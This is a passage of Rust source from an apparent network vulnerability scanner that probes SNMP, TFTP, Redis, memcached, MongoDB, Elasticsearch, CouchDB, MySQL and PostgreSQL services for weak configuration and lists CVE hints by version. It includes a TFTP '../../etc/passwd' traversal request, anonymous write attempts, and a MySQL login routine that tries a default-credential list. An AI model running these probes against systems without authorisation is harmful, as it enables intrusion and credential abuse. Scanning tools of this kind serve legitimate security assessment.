    vblist.push(varbind.len() as u8);
    vblist.extend_from_slice(&varbind);

    let mut pdu_inner = Vec::new();
    push_snmp_int(&mut pdu_inner, request_id);
    push_snmp_int(&mut pdu_inner, 0); // error-status
    push_snmp_int(&mut pdu_inner, 0); // error-index
    pdu_inner.extend_from_slice(&vblist);

    let mut pdu = Vec::new();
    pdu.push(0xA0); // GetRequest
    pdu.push(pdu_inner.len() as u8);
    pdu.extend_from_slice(&pdu_inner);

    let mut msg_inner = Vec::new();
    push_snmp_int(&mut msg_inner, version);
    push_snmp_octetstr(&mut msg_inner, community.as_bytes());
    msg_inner.extend_from_slice(&pdu);

    let mut msg = Vec::new();
    msg.push(0x30);
    msg.push(msg_inner.len() as u8);
    msg.extend_from_slice(&msg_inner);
    msg
}

fn push_snmp_int(buf: &mut Vec<u8>, value: i32) {
    buf.push(0x02);
    buf.push(0x04);
    buf.extend_from_slice(&value.to_be_bytes());
}

fn push_snmp_octetstr(buf: &mut Vec<u8>, data: &[u8]) {
    buf.push(0x04);
    buf.push(data.len() as u8);
    buf.extend_from_slice(data);
}

fn parse_snmp_sysdescr(resp: &[u8], oid: &[u8]) -> Option<String> {
    let needle: Vec<u8> = [&[0x06, oid.len() as u8], oid].concat();
    if let Some(pos) = resp.windows(needle.len()).position(|w| w == needle) {
        let mut idx = pos + needle.len();
        if idx + 2 <= resp.len() && resp[idx] == 0x04 {
            idx += 1;
            let len = resp.get(idx).cloned().unwrap_or(0) as usize;
            idx += 1;
            if idx + len <= resp.len() {
                let val = &resp[idx..idx + len];
                if let Ok(s) = String::from_utf8(val.to_vec()) {
                    return Some(s);
                }
            }
        }
    }
    None
}

/// Tests TFTP for anonymous read/write access and path traversal.
async fn fuzz_tftp_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-TFTP] Starting TFTP checks".into());

    let sock = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
    sock.connect((ip, port)).await?;

    let make_rrq = |filename: &str| -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.extend_from_slice(&[0x00, 0x01]);
        pkt.extend_from_slice(filename.as_bytes());
        pkt.push(0);
        pkt.extend_from_slice(b"octet");
        pkt.push(0);
        pkt
    };
    let make_wrq = |filename: &str| -> Vec<u8> {
        let mut pkt = Vec::new();
        pkt.extend_from_slice(&[0x00, 0x02]);
        pkt.extend_from_slice(filename.as_bytes());
        pkt.push(0);
        pkt.extend_from_slice(b"octet");
        pkt.push(0);
        pkt
    };

    for fname in ["test.txt", "../../etc/passwd"] {
        let req = make_rrq(fname);
        let _ = sock.send(&req).await?;

        let mut buf = [0u8; 516];
        let resp = tokio::time::timeout(Duration::from_secs(3), sock.recv(&mut buf)).await;
        if let Ok(Ok(n)) = resp {
            if n >= 4 && buf[1] == 3 {
                if fname.contains("..") {
                    logs.push("[FUZZ-TFTP]  Path traversal likely (RRQ ../../etc/passwd returned DATA).".into());
                } else {
                    logs.push("[FUZZ-TFTP]  Anonymous read allowed (RRQ returned DATA).".into());
                }
            } else if n >= 4 && buf[1] == 5 {
                // code 1=File not found, 2=Access violation
                let code = (buf[2] as u16) << 8 | buf[3] as u16;
                if code == 2 {
                    logs.push("[FUZZ-TFTP] Access violation on read (server enforcing permissions).".into());
                }
            }
        }
    }

    let wrq = make_wrq("clapscan.txt");
    let _ = sock.send(&wrq).await?;
    let mut buf = [0u8; 516];
    let resp = tokio::time::timeout(Duration::from_secs(3), sock.recv(&mut buf)).await;
    if let Ok(Ok(n)) = resp {
        if n >= 4 && buf[1] == 4 {
            logs.push("[FUZZ-TFTP]  Anonymous write allowed (WRQ acknowledged).".into());
        } else if n >= 4 && buf[1] == 5 {
            let code = (buf[2] as u16) << 8 | buf[3] as u16;
            if code == 2 {
                logs.push("[FUZZ-TFTP] Access violation on write (write protected).".into());
            }
        }
    } else {
        logs.push("[FUZZ-TFTP] No response to WRQ; write likely blocked or server silent.".into());
    }

    if logs.len() == 1 {
        logs.push("[FUZZ-TFTP] No indicators of anonymous access found.".into());
    }

    Ok(logs)
}

/// Tests Syslog (UDP/TCP) for injection risk by sending test messages.
async fn fuzz_syslog_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-SYSLOG] Starting Syslog checks".into());

    let udp = async {
        let sock = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
        sock.connect((ip, port)).await?;
        let msg = b"<13>ClapScan test syslog over UDP";
        let n = sock.send(msg).await?;
        Ok::<usize, std::io::Error>(n)
    }
    .await;

    match udp {
        Ok(_) => logs.push("[FUZZ-SYSLOG]  UDP syslog accepts traffic (consider spoofing/log injection risk).".into()),
        Err(_) => logs.push("[FUZZ-SYSLOG] No UDP response / send failed.".into()),
    }

    let tcp = async {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;
        let msg = b"<13>ClapScan test syslog over TCP\n";
        stream.write_all(msg).await?;
        Ok::<(), std::io::Error>(())
    }
    .await;

    match tcp {
        Ok(_) => logs.push("[FUZZ-SYSLOG]  TCP syslog accepts traffic (log injection possible if not filtered).".into()),
        Err(_) => logs.push("[FUZZ-SYSLOG] TCP syslog not reachable or write failed.".into()),
    }

    Ok(logs)
}

/// Sends IPMI RMCP ping and detects cipher-0 authentication bypass.
async fn fuzz_ipmi_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-IPMI] Starting IPMI checks".into());

    let packet: [u8; 26] = [
        0x06, 0x00, 0xff, 0x07, // RMCP header
        0x00, // RMCP sequence
        0x06, // RMCP class/IPMI
        0x00, 0x00, // Auth/Payload flags (legacy)
        0x00, 0x00, 0x00, 0x00, // Session ID
        0x00, 0x00, 0x00, 0x00, // Session seq
        0x07, // Message length placeholder-ish
        0x20, 0x18, // RsAddr/LUN, NetFn
        0x00, // Checksum1 placeholder
        0x00, // RsLUN/Seq
        0x38, 0x8e, // Command and channel (Get Channel Auth Capabilities, channel 0x0e)
        0x00, // Checksum2 placeholder
        0x00, // Tail pad
        0x00, // Tail pad2
    ];

    let result = async {
        let sock = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
        sock.connect((ip, port)).await?;
        sock.send(&packet).await?;
        let mut buf = [0u8; 1024];
        let n = tokio::time::timeout(Duration::from_secs(3), sock.recv(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<(usize, Vec<u8>), std::io::Error>((n, buf[..n].to_vec()))
    }
    .await;

    match result {
        Ok((n, resp)) if n > 0 => {
            logs.push(format!("[FUZZ-IPMI] Response received ({} bytes)", n));

            if let Some(&byte) = resp.get(14) {
                if byte & 0x01 != 0 {
                    logs.push("[FUZZ-IPMI]  Cipher 0 (no auth) appears supported.".into());
                }
            }

            if let Some(ver) = resp.windows(2).position(|w| w == [0x51, 0x00]) {
                if let Some(b) = resp.get(ver + 2) {
                    logs.push(format!("[FUZZ-IPMI] Firmware/version hint byte: 0x{:02x}", b));
                }
            }
        }
        _ => {
            logs.push("[FUZZ-IPMI] No response; IPMI may be blocked or not present.".into());
        }
    }

    Ok(logs)
}

/// Tests Redis for unauthenticated access; runs INFO, CONFIG, MODULE LIST commands.
async fn fuzz_redis_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();

    logs.push("[FUZZ-REDIS] Starting Redis checks".into());

    async fn redis_cmd(ip: std::net::IpAddr, port: u16, cmd: &str) -> anyhow::Result<String> {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;
        stream.write_all(cmd.as_bytes()).await?;
        let mut buf = [0u8; 4096];
        let n = tokio::time::timeout(Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok(String::from_utf8_lossy(&buf[..n]).to_string())
    }

    let ping_resp = redis_cmd(ip, port, "*1\r\n$4\r\nPING\r\n").await;
    let mut unauthenticated = false;
    match ping_resp {
        Ok(r) if r.starts_with("+PONG") => {
            logs.push("[FUZZ-REDIS]  PING responded without AUTH (no password enforced).".into());
            unauthenticated = true;
        }
        Ok(r) if r.starts_with("-NOAUTH") => {
            logs.push("[FUZZ-REDIS]  AUTH required (NOAUTH).".into());
        }
        Ok(r) => {
            logs.push(format!("[FUZZ-REDIS] PING unexpected response: {}", r.trim()));
        }
        Err(_) => {
            logs.push("[FUZZ-REDIS] PING failed; service may be filtered.".into());
        }
    }

    if unauthenticated {
        if let Ok(info) = redis_cmd(ip, port, "*2\r\n$4\r\nINFO\r\n$6\r\nSERVER\r\n").await {
            for line in info.lines() {
                if let Some(rest) = line.strip_prefix("redis_version:") {
                    logs.push(format!("[FUZZ-REDIS] Version: {}", rest.trim()));
                    logs.push("[FUZZ-REDIS]  Unauthenticated Redis can enable RCE via replication/module load; restrict access.".into());
                }
            }
        }

        if let Ok(cfg) = redis_cmd(ip, port, "*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$10\r\nrequirepass\r\n").await {
            if cfg.contains("$-1") || cfg.contains("$0") || cfg.contains("\r\n$\r\n") {
                logs.push("[FUZZ-REDIS]  requirepass is empty (no password set).".into());
            } else if cfg.contains("requirepass") {
                logs.push("[FUZZ-REDIS] requirepass is set (value redacted).".into());
            }
        }

        if let Ok(cfg) = redis_cmd(ip, port, "*3\r\n$6\r\nCONFIG\r\n$3\r\nGET\r\n$3\r\ndir\r\n").await {
            if let Some(pos) = cfg.find("\r\n$") {
                if let Some(val_start) = cfg[pos + 3..].find("\r\n") {
                    let dir_val = &cfg[pos + 3 + val_start + 2..];
                    if let Some(end) = dir_val.find("\r\n") {
                        logs.push(format!("[FUZZ-REDIS] dir: {}", &dir_val[..end]));
                    }
                }
            }
        }

        if let Ok(mods) = redis_cmd(ip, port, "*2\r\n$6\r\nMODULE\r\n$4\r\nLIST\r\n").await {
            if mods.starts_with("*0") {
                logs.push("[FUZZ-REDIS] No modules loaded.".into());
            } else {
                logs.push(format!("[FUZZ-REDIS] MODULE LIST response: {}", mods.trim()));
            }
        }
    } else {
        logs.push("[FUZZ-REDIS] Skipping INFO/CONFIG because AUTH is required.".into());
    }

    Ok(logs)
}

/// Tests memcached TCP stats and UDP amplification risk.
async fn fuzz_memcached_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    logs.push("[FUZZ-MEMCACHED] Starting memcached checks".into());

    let tcp_res = async {
        let addr = SocketAddr::new(ip, port);
        let mut stream = TcpStream::connect(addr).await?;
        stream.write_all(b"stats\r\n").await?;
        let mut buf = [0u8; 4096];
        let n = tokio::time::timeout(Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&buf[..n]).to_string())
    }
    .await;

    match tcp_res {
        Ok(resp) if resp.starts_with("STAT") => {
            logs.push("[FUZZ-MEMCACHED]  stats accessible without auth.".into());
            if resp.contains("version") {
                if let Some(line) = resp.lines().find(|l| l.contains("version")) {
                    logs.push(format!("[FUZZ-MEMCACHED] {}", line.trim()));
                }
            }
        }
        Ok(resp) => {
            logs.push(format!("[FUZZ-MEMCACHED] Unexpected TCP response: {}", resp.trim()));
        }
        Err(_) => logs.push("[FUZZ-MEMCACHED] TCP stats probe failed.".into()),
    }

    let udp_res = async {
        let sock = tokio::net::UdpSocket::bind(("0.0.0.0", 0)).await?;
        sock.connect((ip, port)).await?;
        let mut pkt = Vec::new();
        pkt.extend_from_slice(&0u16.to_be_bytes()); // request id
        pkt.extend_from_slice(&0u16.to_be_bytes()); // seq
        pkt.extend_from_slice(&1u16.to_be_bytes()); // total packets
        pkt.extend_from_slice(&0u16.to_be_bytes()); // reserved
        pkt.extend_from_slice(b"stats\r\n");
        sock.send(&pkt).await?;
        let mut buf = [0u8; 2048];
        let n = tokio::time::timeout(Duration::from_secs(3), sock.recv(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<usize, std::io::Error>(n)
    }
    .await;

    match udp_res {
        Ok(n) if n > 1000 => {
            logs.push("[FUZZ-MEMCACHED]  Large UDP response; potential amplification vector.".into());
        }
        Ok(n) if n > 0 => {
            logs.push(format!("[FUZZ-MEMCACHED] UDP responded ({} bytes).", n));
        }
        _ => logs.push("[FUZZ-MEMCACHED] No UDP response.".into()),
    }

    Ok(logs)
}

/// Tests MongoDB legacy isMaster command for version extraction and CVE hints.
async fn fuzz_mongodb_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    logs.push("[FUZZ-MONGODB] Starting MongoDB checks".into());

    let addr = SocketAddr::new(ip, port);
    let res = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut msg = Vec::new();
        let request_id: i32 = 1;
        let response_to: i32 = 0;
        let op_code: i32 = 2004; // OP_QUERY
        let flags: i32 = 0;
        let full_collection = b"admin.$cmd\0";
        let number_to_skip: i32 = 0;
        let number_to_return: i32 = -1;
        let query_doc = bson_doc_ismaster();
        let msg_len = 16 + 4 + (full_collection.len() as i32) + 4 + 4 + (query_doc.len() as i32);
        msg.extend_from_slice(&msg_len.to_le_bytes());
        msg.extend_from_slice(&request_id.to_le_bytes());
        msg.extend_from_slice(&response_to.to_le_bytes());
        msg.extend_from_slice(&op_code.to_le_bytes());
        msg.extend_from_slice(&flags.to_le_bytes());
        msg.extend_from_slice(full_collection);
        msg.extend_from_slice(&number_to_skip.to_le_bytes());
        msg.extend_from_slice(&number_to_return.to_le_bytes());
        msg.extend_from_slice(&query_doc);
        stream.write_all(&msg).await?;
        let mut buf = [0u8; 4096];
        let n = tokio::time::timeout(Duration::from_secs(3), stream.read(&mut buf))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<Vec<u8>, std::io::Error>(buf[..n].to_vec())
    }
    .await;

    match res {
        Ok(resp) if !resp.is_empty() => {
            if let Some(info) = parse_mongo_ismaster(&resp) {
                if let Some(ver) = info.version {
                    logs.push(format!("[FUZZ-MONGODB] Version: {}", ver));
                    logs.push("[FUZZ-MONGODB]  If authentication is disabled, remote access allows full DB control.".into());
                    logs.extend(mongo_cve_hints(&ver));
                }
                if info.ismaster {
                    logs.push("[FUZZ-MONGODB] ismaster: true".into());
                }
            } else {
                logs.push("[FUZZ-MONGODB] Received response but could not parse ismaster info.".into());
            }
        }
        _ => logs.push("[FUZZ-MONGODB] No ismaster response (auth/SSL/blocked?).".into()),
    }

    Ok(logs)
}

fn bson_doc_ismaster() -> Vec<u8> {
    let mut doc = Vec::new();
    doc.extend_from_slice(&0i32.to_le_bytes()); // placeholder len
    doc.push(0x10); // int32 type
    doc.extend_from_slice(b"ismaster\0");
    doc.extend_from_slice(&1i32.to_le_bytes());
    doc.push(0x00); // terminator
    let len = doc.len() as i32;
    doc[0..4].copy_from_slice(&len.to_le_bytes());
    doc
}

struct MongoIsMaster {
    version: Option<String>,
    ismaster: bool,
}

fn parse_mongo_ismaster(resp: &[u8]) -> Option<MongoIsMaster> {
    // payload offset 36 (16 header + 20 reply)
    if resp.len() < 36 {
        return None;
    }
    let payload = &resp[36..];
    let mut version = None;
    let mut ismaster = false;
    let mut i = 0;
    while i + 5 < payload.len() {
        let t = payload[i];
        if t == 0x00 {
            break;
        }
        let mut key_end = i + 1;
        while key_end < payload.len() && payload[key_end] != 0 {
            key_end += 1;
        }
        if key_end >= payload.len() {
            break;
        }
        let key = &payload[i + 1..key_end];
        let key_str = String::from_utf8_lossy(key);
        let val_start = key_end + 1;
        match t {
            0x08 => { // bool
                if key_str == "ismaster" && val_start < payload.len() {
                    ismaster = payload[val_start] != 0;
                }
                i = val_start + 1;
            }
            0x02 => { // string
                if val_start + 4 <= payload.len() {
                    let len = i32::from_le_bytes([
                        payload[val_start],
                        payload[val_start + 1],
                        payload[val_start + 2],
                        payload[val_start + 3],
                    ]) as usize;
                    let str_start = val_start + 4;
                    if str_start + len <= payload.len() && key_str == "version" {
                        if let Ok(s) = String::from_utf8(payload[str_start..str_start + len - 1].to_vec()) {
                            version = Some(s);
                        }
                    }
                    i = str_start + len;
                } else {
                    break;
                }
            }
            _ => {
                break;
            }
        }
    }

    Some(MongoIsMaster { version, ismaster })
}

fn mongo_cve_hints(version: &str) -> Vec<String> {
    let mut hints = Vec::new();
    if version.starts_with('2') || version.starts_with("3.0") || version.starts_with("3.2") {
        hints.push("[FUZZ-MONGODB][CVE] Very old MongoDB; multiple RCE/auth issues (e.g., CVE-2015-1609).".into());
    }
    if version.starts_with("3.6") || version.starts_with("4.0") {
        hints.push("[FUZZ-MONGODB][CVE] MongoDB 3.6/4.0 had auth bypass/DoS issues; ensure latest patch level.".into());
    }
    if version.starts_with("4.2") {
        hints.push("[FUZZ-MONGODB][CVE] MongoDB 4.2 early releases had security fixes; check release notes.".into());
    }
    hints
}

/// Tests Elasticsearch/CouchDB for unauthenticated API access and version CVE hints.
async fn fuzz_es_couch_vulnerabilities(target: &str, port: u16) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    let mut logs = Vec::new();

    let result = async {
        let mut stream = TcpStream::connect(addr).await?;
        let req = format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", target);
        stream.write_all(req.as_bytes()).await?;
        let mut buf = Vec::new();
        stream.read_to_end(&mut buf).await?;
        Ok::<String, std::io::Error>(String::from_utf8_lossy(&buf).to_string())
    }
    .await;

    match result {
        Ok(resp) => {
            let status = resp.lines().next().unwrap_or("").to_string();
            logs.push(format!("[FUZZ-ES/COUCH] Status: {}", status.trim()));

            if port == 9200 {
                if resp.contains("cluster_name") {
                    logs.push("[FUZZ-ELASTIC]  Elasticsearch API exposed without auth.".into());
                    if let Some(ver) = extract_json_field(&resp, "\"number\":\"") {
                        logs.push(format!("[FUZZ-ELASTIC] Version: {}", ver));
                        logs.extend(elastic_cve_hints(&ver));
                    }
                }
            } else if port == 5984 {
                if resp.to_lowercase().contains("couchdb") {
                    logs.push("[FUZZ-COUCHDB]  CouchDB welcome detected (unauthenticated).".into());
                    if let Some(ver) = extract_json_field(&resp, "\"version\":\"") {
                        logs.push(format!("[FUZZ-COUCHDB] Version: {}", ver));
                        logs.extend(couchdb_cve_hints(&ver));
                    }
                }
            }
        }
        Err(_) => logs.push("[FUZZ-ES/COUCH] HTTP probe failed.".into()),
    }

    Ok(logs)
}

fn extract_json_field(body: &str, key: &str) -> Option<String> {
    if let Some(pos) = body.find(key) {
        let start = pos + key.len();
        if let Some(end) = body[start..].find('"') {
            return Some(body[start..start + end].to_string());
        }
    }
    None
}

fn elastic_cve_hints(version: &str) -> Vec<String> {
    let mut hints = Vec::new();
    if version.starts_with("1.") || version.starts_with("2.") {
        hints.push("[FUZZ-ELASTIC][CVE] Old Elasticsearch; check CVE-2014-3120 / CVE-2015-1427 (script RCE).".into());
    }
    if version.starts_with("5.") {
        hints.push("[FUZZ-ELASTIC][CVE] Elasticsearch 5.x had multiple XXE/RCE fixes; ensure latest minor.".into());
    }
    hints
}

fn couchdb_cve_hints(version: &str) -> Vec<String> {
    let mut hints = Vec::new();
    if version.starts_with("1.") || version.starts_with("2.0") || version.starts_with("2.1") {
        hints.push("[FUZZ-COUCHDB][CVE] Check CVE-2017-12635/12636 (auth bypass/RCE).".into());
    }
    if version.starts_with("3.0") || version.starts_with("3.1") {
        hints.push("[FUZZ-COUCHDB][CVE] CouchDB 3.x early had CVE-2022-24706 (remote code execution) fixes.".into());
    }
    hints
}

/// Tests MySQL for weak/default credentials and extracts version for CVE lookup.
async fn fuzz_mysql_vulnerabilities(target: &str, port: u16, credentials: Option<(&str, &str)>) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    logs.push("[FUZZ-MySQL] Starting MySQL checks".into());

    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;
    let mut buf = [0u8; 512];
    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n < 5 {
        logs.push("[FUZZ-MySQL] No handshake received".into());
        return Ok(logs);
    }

    let payload_len = (buf[0] as usize) | ((buf[1] as usize) << 8) | ((buf[2] as usize) << 16);
    let payload_end = std::cmp::min(n, payload_len + 4);
    if payload_end <= 4 {
        logs.push("[FUZZ-MySQL] Handshake packet truncated".into());
        return Ok(logs);
    }

    let payload = &buf[4..payload_end];

    if payload.is_empty() {
        logs.push("[FUZZ-MySQL] Handshake payload empty".into());
        return Ok(logs);
    }

    let mut pos = 1; // skip protocol version byte
    while pos < payload.len() && payload[pos] != 0 {
        pos += 1;
    }
    let version = if pos > 1 {
        String::from_utf8_lossy(&payload[1..pos]).to_string()
    } else {
        "unknown".into()
    };
    logs.push(format!("[FUZZ-MySQL] Server version: {}", version));

    let mut caps: u32 = 0;
    let cap_low_off = pos + 1 + 4 + 8 + 1; // version\0 + connection id + scramble part1 + filler
    if payload.len() >= cap_low_off + 2 {
        let cap_low = u16::from_le_bytes([payload[cap_low_off], payload[cap_low_off + 1]]);
        caps |= cap_low as u32;
        if payload.len() >= cap_low_off + 2 + 1 + 2 + 2 {
            let cap_high_off = cap_low_off + 2 + 1 + 2;
            let cap_high = u16::from_le_bytes([payload[cap_high_off], payload[cap_high_off + 1]]);
            caps |= (cap_high as u32) << 16;
        }
    }

    if caps & 0x0800 != 0 {
        logs.push("[FUZZ-MySQL]  Server advertises SSL/TLS (CLIENT_SSL)".into());
    } else {
        logs.push("[FUZZ-MySQL]  SSL/TLS not advertised; credentials would travel in cleartext".into());
    }

    if caps & 0x8000 == 0 {
        logs.push("[FUZZ-MySQL]  Legacy pre-4.1 auth (CLIENT_SECURE_CONNECTION missing)".into());
    }

    let plugin = (|| {
        if payload.len() >= cap_low_off + 2 + 1 + 2 + 2 + 1 + 10 {
            let auth_off = cap_low_off + 2 + 1 + 2 + 2 + 1 + 10;
            if auth_off < payload.len() {
                let end = payload[auth_off..]
                    .iter()
                    .position(|b| *b == 0)
                    .map(|p| auth_off + p)
                    .unwrap_or(payload.len());
                return Some(String::from_utf8_lossy(&payload[auth_off..end]).to_string());
            }
        }
        None
    })();

    if let Some(p) = plugin {
        logs.push(format!("[FUZZ-MySQL] Auth plugin: {}", p));
        let pl = p.to_lowercase();
        if pl.contains("old_password") {
            logs.push("[FUZZ-MySQL]  Uses mysql_old_password (very weak)".into());
        }
        if pl.contains("clear_password") {
            logs.push("[FUZZ-MySQL]  cleartext auth plugin in use; require TLS".into());
        }
    }

    for cve in mysql_cves_for_version(&version) {
        logs.push(format!("[FUZZ-MySQL] CVE hint: {}", cve));
    }

    let default_creds = vec![
        ("root", ""),
        ("root", "root"),
        ("root", "password"),
        ("admin", "admin"),
        ("admin", "password"),
        ("mysql", "mysql"),
    ];
    
    let creds_to_try = credentials.map(|c| vec![c]).unwrap_or(default_creds);
    let mut any_success = false;
    
    for (user, pass) in creds_to_try {
        if let Ok(()) = try_mysql_login(target, port, user, pass).await {
            logs.push(format!("[FUZZ-MySQL]  Successful login with '{}':'{}'", user, pass));
            any_success = true;
        }
    }
    
    if !any_success {
        logs.push("[FUZZ-MySQL]  Default credentials attempts failed".into());
    }

    Ok(logs)
}

async fn try_mysql_login(target: &str, port: u16, user: &str, pass: &str) -> anyhow::Result<()> {
    let ip = resolve_host(target).await?;
    let addr = SocketAddr::new(ip, port);
    let mut stream = TcpStream::connect(addr).await?;
    let mut buf = [0u8; 512];
    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n < 5 {
        return Err(anyhow::anyhow!("MySQL handshake too short"));
    }

    let payload_len = (buf[0] as usize) | ((buf[1] as usize) << 8) | ((buf[2] as usize) << 16);
    let payload_end = std::cmp::min(n, payload_len + 4);
    if payload_end <= 4 {
        return Err(anyhow::anyhow!("Handshake payload truncated"));
    }

    let payload = &buf[4..payload_end];
    if payload.is_empty() || payload[0] != 10 {
        return Err(anyhow::anyhow!("Not a valid MySQL handshake"));
    }

    let mut pos = 1; // skip protocol version
    while pos < payload.len() && payload[pos] != 0 {
        pos += 1;
    }
    pos += 1;
    if pos + 4 > payload.len() {
        return Err(anyhow::anyhow!("Handshake too short for connection id"));
    }

    // Skip connection_id (4 bytes)
    let auth_part1_start = pos + 4;
    if auth_part1_start + 8 > payload.len() {
        return Err(anyhow::anyhow!("Handshake too short for auth part 1"));
    }

    let mut auth_plugin = "mysql_native_password".to_string();
    let mut auth_part2_start = auth_part1_start + 8 + 1 + 2 + 1 + 2 + 2; // skip auth_part1, filter, cap_low, charset, status, cap_high
    if auth_part2_start + 1 <= payload.len() {
        let _auth_plugin_len = payload[auth_part2_start];
        auth_part2_start += 1;
        auth_part2_start += 10; // reserved
        if auth_part2_start + 12 <= payload.len() {
            if let Some(null_pos) = payload[auth_part2_start + 12..]
                .iter()
                .position(|b| *b == 0)
            {
                auth_plugin = String::from_utf8_lossy(
                    &payload[auth_part2_start + 12..auth_part2_start + 12 + null_pos],
                )
                .to_string();
            }
        }
    }

    // Combine salt: first 8 bytes of auth_part1 + 12 bytes of auth_part2
    let mut salt = vec![0u8; 20];
    if auth_part1_start + 8 <= payload.len() {
        salt[0..8].copy_from_slice(&payload[auth_part1_start..auth_part1_start + 8]);
    }
    if auth_part2_start + 12 <= payload.len() {
        salt[8..20].copy_from_slice(&payload[auth_part2_start..auth_part2_start + 12]);
    }

    let mut response = vec![0u8; 20];
    if auth_plugin == "mysql_native_password" {
        let mut hasher = Sha1::new();
        hasher.update(pass.as_bytes());
        let password_sha1 = hasher.finalize();

        let mut hasher = Sha1::new();
        hasher.update(&password_sha1);
        hasher.update(&salt);
        let hash_of_hash = hasher.finalize();

        for i in 0..20 {
            response[i] = password_sha1[i] ^ hash_of_hash[i];
        }
    }

    // Send AuthResponse: client_flag(4) + max_packet(4) + charset(1) + reserved(23) + username + null + response
    let mut auth_response = Vec::new();
    auth_response.extend_from_slice(&[0x85, 0xa2, 0x0e, 0x00]); // CLIENT_PROTOCOL_41 | CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH
    auth_response.extend_from_slice(&[0x00, 0x00, 0x00, 0x01]); // max_packet = 16MB
    auth_response.push(0x21); // charset utf8 (33)
    auth_response.extend_from_slice(&[0; 23]); // reserved
    auth_response.extend_from_slice(user.as_bytes());
    auth_response.push(0);
    auth_response.extend_from_slice(&response);

    // Build packet: length(3) + sequence(1) + payload
    let mut packet = Vec::new();
    packet.extend_from_slice(&((auth_response.len() as u32).to_le_bytes()[0..3]));
    packet.push(1); // sequence number
    packet.extend_from_slice(&auth_response);

    stream.write_all(&packet).await?;

    let mut buf = [0u8; 512];
    let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut buf))
        .await
        .unwrap_or(Ok(0))?;

    if n < 5 {
        return Err(anyhow::anyhow!("No auth response"));
    }

    // 0x00 = OK, 0xff = error, 0xfe = authswitch
    let response_type = buf[4];
    if response_type == 0x00 {
        return Ok(());
    }

    Err(anyhow::anyhow!("Auth failed or requires switch"))
}

fn mysql_cves_for_version(version: &str) -> Vec<String> {
    let v = version.to_lowercase();
    let mut hints = Vec::new();

    let parts: Vec<&str> = v.split('.').collect();
    let major = parts.get(0).and_then(|p| p.parse::<u32>().ok());
    let minor = parts.get(1).and_then(|p| p.parse::<u32>().ok());

    match (major, minor) {
        (Some(5), Some(5)) => {
            hints.push("MySQL 5.5 EOL; CVE-2012-2122 (auth bypass), CVE-2013-0883 (ICP)".into());
        }
        (Some(5), Some(6)) => {
            hints.push("MySQL 5.6 EOL; CVE-2012-2122, CVE-2016-0502 (remote auth bypass), CVE-2016-6662".into());
        }
        (Some(5), Some(7)) => {
            hints.push("MySQL 5.7 nearing EOL; CVE-2016-6662 (priv esc), CVE-2016-3492 (DoS), CVE-2020-14576".into());
        }
        (Some(8), _) => {
            hints.push("MySQL 8.x (supported); check recent CVEs (e.g., CVE-2021-22928, CVE-2022-21427)".into());
        }
        _ if v.contains("mariadb") => {
            if let Some(m) = major {
                match m {
                    10 => hints.push("MariaDB 10.x: CVE-2021-27928 (auth), CVE-2019-17595; use 10.5+ with tighter defaults".into()),
                    11 => hints.push("MariaDB 11.x (modern); keep patched for server-side fixes".into()),
                    _ => hints.push("MariaDB: check release notes for privilege escalation/auth issues".into()),
                }
            }
        }
        _ => {
            hints.push(format!("MySQL/MariaDB {}: no specific mapping; check vendor advisories", version));
        }
    }

    hints
}

/// Tests PostgreSQL for weak credentials (MD5, cleartext, SCRAM-SHA-256) and SSL/TLS support.
async fn fuzz_postgres_vulnerabilities(target: &str, port: u16, credentials: Option<(&str, &str)>) -> anyhow::Result<Vec<String>> {
    let ip = resolve_host(target).await?;
    let mut logs = Vec::new();
    logs.push("[FUZZ-PG] Starting PostgreSQL checks".into());

    let addr = SocketAddr::new(ip, port);

    let ssl_response = async {
        let mut stream = TcpStream::connect(addr).await?;
        let mut req = Vec::with_capacity(8);
        req.extend_from_slice(&8u32.to_be_bytes());
        req.extend_from_slice(&80877103u32.to_be_bytes());
        stream.write_all(&req).await?;
        let mut b = [0u8; 1];
        let n = tokio::time::timeout(std::time::Duration::from_secs(3), stream.read(&mut b))
            .await
            .unwrap_or(Ok(0))?;
        Ok::<Option<u8>, std::io::Error>(if n == 1 { Some(b[0]) } else { None })
    }
    .await;

    let mut ssl_supported = false;
    match ssl_response {
